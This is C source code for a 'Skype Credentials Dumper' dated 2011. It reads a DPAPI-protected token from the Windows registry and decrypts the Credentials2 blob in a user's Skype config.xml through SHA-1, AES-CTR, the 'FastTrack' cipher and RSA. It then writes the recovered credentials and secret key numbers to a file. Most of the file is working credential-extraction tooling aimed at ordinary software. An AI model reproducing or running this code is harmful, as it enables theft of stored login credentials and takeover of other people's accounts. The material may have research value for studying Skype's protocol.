/*\
|*|
|*| Skype Credentials Dumper v0.1
|*| by leecher@dose.0wnz.at 2011
|*|
|*| Includes: Credentials dumper code
|*|
|*| Date: 14.06.2011
|*|
\*/

//#include <stdio.h>
#include <string.h>
#include "SkypeControl/skype_basics.h"
#include "sha1/sha1.h"
#include "crc32/crc32.h"
#include "miracl/miracl.h"
#include "common.h"

// from wincrypt.h, but if we have old SDK...
#ifndef __WINCRYPT_H__
typedef struct
{
  DWORD cbData;
  BYTE* pbData;
}
DATA_BLOB;
#endif

typedef BOOL (WINAPI *PROC1)
    (DATA_BLOB *,void *,void *,void *,
     void *,void *,DATA_BLOB *);

static int GetRandKey(DATA_BLOB *DataOut)
{
	HKEY hKey;
	DATA_BLOB DataIn={0};
	LONG lErr;
	int iRet = -1;
	HMODULE hCrypt32dll;
	PROC1 CryptUnprotectData;

	memset (DataOut, 0, sizeof(DATA_BLOB));
    if( ! ( hCrypt32dll = LoadLibraryA( "Crypt32.dll" ) ) )
    {
        fprintf(stderr, "Cannot load Crypt32.dll: %08X\n", GetLastError());
        return -1;
    }

    if( ! ( CryptUnprotectData = (PROC1) GetProcAddress(
                hCrypt32dll, "CryptUnprotectData" ) ) )
    {
		fprintf(stderr, "Cannot find CryptUnprotectData in crypt32.dll: %08X\n", GetLastError());
        return -1;
    }

	if ((lErr = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Skype\\ProtectedStorage", 0, KEY_READ, &hKey)) != ERROR_SUCCESS ||
		(lErr = RegQueryValueExA(hKey, "0", NULL, NULL, NULL, &DataIn.cbData)) != ERROR_SUCCESS )
	{
		fprintf (stderr, "Cannot find registry key: %08X\n", lErr);
		return -1;
	}
	if (DataIn.pbData = (LPVOID)LocalAlloc(LMEM_FIXED, DataIn.cbData))
	{
		if ((lErr = RegQueryValueExA(hKey, "0", NULL, NULL, DataIn.pbData, &DataIn.cbData)) == ERROR_SUCCESS)
		{
			if (CryptUnprotectData (&DataIn, NULL, NULL, NULL, NULL, 0, DataOut)) iRet = 0;
			else fprintf (stderr, "Error decrypting data blob: %08X\n", GetLastError());
		} else fprintf (stderr, "Cannot query value: %08X\n", lErr);

		LocalFree (DataIn.pbData);
	}
	else fprintf (stderr, "Out of memory allocating %d bytes\n", DataIn.cbData);


	RegCloseKey (hKey);
	FreeLibrary (hCrypt32dll);
	return iRet;
}

static void Decrypt_Session_Key (DATA_BLOB *rndkey, u32 *key256)
{
	SHA1_state		skyper = SHA1_INIT;
	u32				n = 0;

	// Hashing it into 256-bit AES key
	SHA1_update (&skyper, &n, 4);
	SHA1_update (&skyper, rndkey->pbData, 24);
	SHA1_end (&skyper);
	memcpy (key256, skyper.hash, 20);
	n = 0x01000000;
	SHA1_init (&skyper);
	SHA1_update (&skyper, &n, 4);
	SHA1_update (&skyper, rndkey->pbData, 24);
	SHA1_end (&skyper);
	memcpy (key256+5, skyper.hash, 12);
}

static int Parse_ConfigXML(char *pszFile, DATA_BLOB *pHash)
{
	FILE *fp = fopen(pszFile, "r");
	char szLine[4096], *pCred, *p;
	int iRet = -1;
	unsigned int i;

	if (!fp)
	{
		fprintf (stderr, "Cannot open config file %s\n", pszFile);
		return -1;
	}
	memset (pHash, 0, sizeof(DATA_BLOB));
	while (fgets(szLine, sizeof(szLine), fp))
	{
		if (pCred = strstr(szLine, "<Credentials2>"))
		{
			pCred+=14;
			if (p=strchr(pCred, '<'))
			{
				unsigned long crcsum;

				*p=0;
				pHash->cbData = (p-pCred) >> 1;
				pHash->pbData = LocalAlloc (LMEM_FIXED, pHash->cbData*2);
				for (i=0; i<pHash->cbData; i++) sscanf(pCred+i*2, "%02X", &((char*)pHash->pbData)[i]);

				// Verify hash
				crcsum = _crc32(pHash->pbData, pHash->cbData-sizeof(short));
				if (*((short*)((char*)pHash->pbData+pHash->cbData-sizeof(short))) != (short)(crcsum & 0xFFFF))
					fprintf (stderr, "CRC mismatch in Credentials2 in config file %s!\n", pszFile);
				else iRet = 0;
			}
			break;
		}
	}
	fclose(fp);
	if (!pHash->cbData) {
		fprintf(stderr, "Hash not found in config file %s\n", pszFile);
		fprintf(stderr, "\nSaved key not found\n");
		fprintf(stderr, "You need login with \"sign me in when skype starts\" option\n");
		//fprintf(stderr, "Perhaps locked profile. You need exit from skype\n");
		//fprintf(stderr, "Only 3.x skype profiles supported\n");
	};
	return iRet;
}

static void FastTrack_decode(unsigned char *buf, unsigned int iLen)
{
  unsigned int crc;
  unsigned int i;

  if ( iLen >= 16 )
  {
    crc = _crc32(buf, 16);
    for ( i = 16; i < iLen; i++ )
	{
      crc = 69069 * crc + 17009;
	  buf[i] ^= (crc >> 24);
	}
  }
}

static int DumpCredToFile(char *pszUser, char *pszPass, char *pszFile, DATA_BLOB *credentials2,
				   char *credentials)
{
	FILE *fp = fopen(pszFile, "w");
	unsigned char *s, *pEnd;
	unsigned int i,j;

	if (!fp) {
		fprintf (stderr, "Cannot open file %s for writing\n", pszFile);
		return -1;
	}
	if (!pszPass) pszPass = "skypepass";
	

	// You may need to correct password etc. manually, this is just a dummy template
	fprintf (fp, "%s:%s:FirstNameAndLastName:my@email.com:4.1.0.179:",
		pszUser, pszPass);

	// Credentials
	for (s=credentials2->pbData+credentials2->cbData-sizeof(short)-260,
		pEnd=credentials2->pbData+credentials2->cbData-sizeof(short); s<pEnd; s++)
		fprintf (fp, "%02X", *s);
	fprintf (fp, ":");

	// Secret key (initial p - number)
	s=credentials2->pbData+0x10+4+0x40;
	for (i=0; i<16; i++){
		// one 4-bytes chunk
		s=s-4;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		if (i<15) fprintf (fp, ".", *s);
		// prev 4-bytes chunk
		s=s-4;
	};
	fprintf (fp, ":");
	
	// Secret key (initial q - number)
	s=credentials2->pbData+0x10+4+0x40+0x40;
	for (i=0; i<16; i++){
		// one 4-bytes chunk
		s=s-4;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		fprintf (fp, "%02X", *s);
		s++;
		if (i<15) fprintf (fp, ".", *s);
		// prev 4-bytes chunk
		s=s-4;
	};

	fclose(fp);
	printf ("Credentials written to file %s\n", pszFile);
	return 0;

}

/* Decrypting credentials from config file as specified in 
 * Vanilla Sykpe presentation
 *
 * Author: leecher@dose.0wnz.at
 * Date  : 13.06.2011
 *
 * Function:
 * Reads credentials string from config.xml and decrypts it using
 * ProtectedStorage hash
 *
 * Parameters:
 * pszUser  - Username of the user whose credentials you want to get
 * pszPass  - OPTIONAL: Password of user, will be written to dumpfile and can be used to
 *            verify credentials.
 *            Set to NULL if you don't have/need it.
 * pszDumpF - OPTIONAL: File to dump credentials to. If you don't need it, set to NULL,
 *            credentials will be dumped to console only.
 */
int DecryptCred(char *pszUser, char *pszPass, char *pszDumpF)
{
	DATA_BLOB rndkey, credentials2;
	u8 credentials[256];
	int n=0, iRet = -1;
	u32				key256[8];
	char szBuf[MAX_PATH], szFile[MAX_PATH];

	/* Get token from registry */
	if (GetRandKey(&rndkey)<0) return -1;
	printf ("This is your Token from registry:\n");
	bindump (rndkey.pbData, rndkey.cbData);

	/* Get Credentials2 hash from config.xml */
	sprintf (szBuf, "%%APPDATA%%\\Skype\\%s\\config.xml", pszUser);
	ExpandEnvironmentStringsA (szBuf, szFile, sizeof(szFile));
	if (Parse_ConfigXML(szFile, &credentials2) == 0)
	{
		int iValid = 1;

		/* Stage 1 - Use incremental counter mode SHA-1 to create a 32 byte key from the token */
		Decrypt_Session_Key (&rndkey, key256);
		printf ("SHA1 key for Token:\n");
		bindump (key256, 32);

		/* Stage 2 - Use incremental counter mode AES to decrypt the credentials */
		AES_CTR (key256, credentials2.pbData, credentials2.cbData-sizeof(short) /*CRC*/, 0);
		printf ("Credentials after AES decrypt:\n");
		bindump (credentials2.pbData, credentials2.cbData);

		// Verify, if possible
		if (pszPass)
		{
			unsigned char szUserHash[16];
			
			MD5_Skype_Password (pszUser, pszPass, szUserHash);
			if (memcmp (credentials2.pbData, szUserHash, 16))
			{
				fprintf (stderr, "Hash from credentials doesn't match supplied username/password\n");
				iValid = 0;
			}
		}

		if (iValid)
		{
			/* Stage 3 - Use the login MD5 hash as key for the "FastTrack cipher" */
			FastTrack_decode(credentials2.pbData, credentials2.cbData-sizeof(short) /*CRC*/);
			printf ("Credentials after Fasttrack decode:\n");
			bindump (credentials2.pbData, credentials2.cbData);

			/* Stage 4 - Use the correct Skype public key to decrypt the remaining RSA block */
			if (Decrypt_Credentials(credentials2.pbData + credentials2.cbData-sizeof(short) /*CRC*/ - 256, credentials) == 0)
			{
				printf ("Decrypted credentials:\n");
				bindump (credentials, 256);

				/* Now credentials2 is fully decrypted, dump it in our fileformat */
				if (pszDumpF) DumpCredToFile (pszUser, pszPass, pszDumpF, &credentials2, credentials);
				iRet = 0;
			}else{ 
				printf("Oops.\n");
			};
		}
		LocalFree (credentials2.pbData);
	}
	LocalFree (rndkey.pbData);
	return iRet;
}


int skype_cred (char *pszUser, char *pszPass, char *pszDumpF)
{
	// local variables in each thread:
	miracl				mip, *mr_mip=&mip;

	mirsys (_MIPP_ -256, 0); // up to 2048-bit keys, no mallocs
	return DecryptCred(pszUser, pszPass, pszDumpF);
}
